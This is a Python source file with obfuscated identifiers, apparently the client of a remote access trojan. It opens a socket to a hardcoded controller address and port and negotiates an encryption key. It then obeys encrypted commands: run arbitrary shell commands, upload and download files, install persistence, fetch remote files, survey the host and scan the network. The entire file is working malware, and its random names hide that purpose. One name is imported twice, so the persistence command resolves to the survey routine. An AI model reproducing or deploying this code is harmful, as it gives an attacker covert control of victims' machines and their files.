#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import CkoyYDxmdvqmpDqmiDQfNmYJEooZuJfR, aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu, uzwtEZAIcAlkEUgSDDweqaCnAdgheMQc
    from core.filesock import CJaDqhybJXLaLvKovpVOBoslaLrUFgCi, fwTVfMnsGkhBgXZUJprRUDzBlsiQfVQB
    from core.persistence import XkzeDrNjOxKRNFyUvDKlNpoqbMQVKThp
    from core.scan import GTNwDzYuHtAruxpPMVsjCisGlsWOQvoR
    from core.survey import XkzeDrNjOxKRNFyUvDKlNpoqbMQVKThp
    from core.toolkit import MvsxOckMDUuCxUTEMjPxoqmnxnPPluSc, tAwBBLJuYUpjfKGKmoHiMchedOirrdBI
except ImportError as YWGwOkqWBDPrjsjKmKjRtdIblOwMSAAF:
    print(YWGwOkqWBDPrjsjKmKjRtdIblOwMSAAF)
    sys.exit(0)
iUQeRwxkQXERLqvnjZbaVoeoyUIHnJVk = sys.platform
xSLUfJrbitSkbINiHIdiGAYnnZxzkzBb      = 'localhost'
VSBWrGBSKZaleaBcBtavpVRMYfAWdirD      = 1337
wiakvVQTpzJqrLISsvGBwPmKhkusZqOk    = 'b14ce95fa4c33ac2803782d18341869f'
def dzIXxNJjKrHldXbZNcDmXhAACACtFDWk():
    WerXeVRoSuIOUzPqeUfRcYEiijTiROFb = socket.socket()
    WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.connect((xSLUfJrbitSkbINiHIdiGAYnnZxzkzBb, VSBWrGBSKZaleaBcBtavpVRMYfAWdirD))
    ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl = uzwtEZAIcAlkEUgSDDweqaCnAdgheMQc(WerXeVRoSuIOUzPqeUfRcYEiijTiROFb)
    while True:
        naTvimYdGIpMrQoVBwHAYqBZSKeiSFCc = WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.recv(1024)
        naTvimYdGIpMrQoVBwHAYqBZSKeiSFCc = CkoyYDxmdvqmpDqmiDQfNmYJEooZuJfR(naTvimYdGIpMrQoVBwHAYqBZSKeiSFCc, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl)
        MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud, _, gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy = naTvimYdGIpMrQoVBwHAYqBZSKeiSFCc.partition(' ')
        if MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'quit':
            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.close()
            sys.exit(0)
        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'run':
            WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = subprocess.Popen(gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO.stdout.read() + WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO.stderr.read()
            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.sendall(aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu(WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl))
        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'download':
            for eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci in gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy.split():
                eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci = eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci.strip()
                fwTVfMnsGkhBgXZUJprRUDzBlsiQfVQB(WerXeVRoSuIOUzPqeUfRcYEiijTiROFb, eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl)
        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'upload':
            for eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci in gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy.split():
                eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci = eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci.strip()
                CJaDqhybJXLaLvKovpVOBoslaLrUFgCi(WerXeVRoSuIOUzPqeUfRcYEiijTiROFb, eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl)
        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'rekey':
            ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl = uzwtEZAIcAlkEUgSDDweqaCnAdgheMQc(WerXeVRoSuIOUzPqeUfRcYEiijTiROFb)
        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'persistence':
            WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = XkzeDrNjOxKRNFyUvDKlNpoqbMQVKThp(iUQeRwxkQXERLqvnjZbaVoeoyUIHnJVk)
            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.send(aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu(WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl))
        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'wget':
            WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = MvsxOckMDUuCxUTEMjPxoqmnxnPPluSc(gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy)
            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.send(aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu(WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl))
        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'unzip':
            WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = tAwBBLJuYUpjfKGKmoHiMchedOirrdBI(gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy)
            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.send(aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu(WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl))
        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'survey':
            WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = XkzeDrNjOxKRNFyUvDKlNpoqbMQVKThp(iUQeRwxkQXERLqvnjZbaVoeoyUIHnJVk)
            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.send(aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu(WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl))
        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'scan':
            WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO = GTNwDzYuHtAruxpPMVsjCisGlsWOQvoR(gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy)
            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.send(aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu(WqGavNByNiJmJFFTbOBHPCDHbDVGVcOO, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl))
if __name__ == '__main__':
    dzIXxNJjKrHldXbZNcDmXhAACACtFDWk()
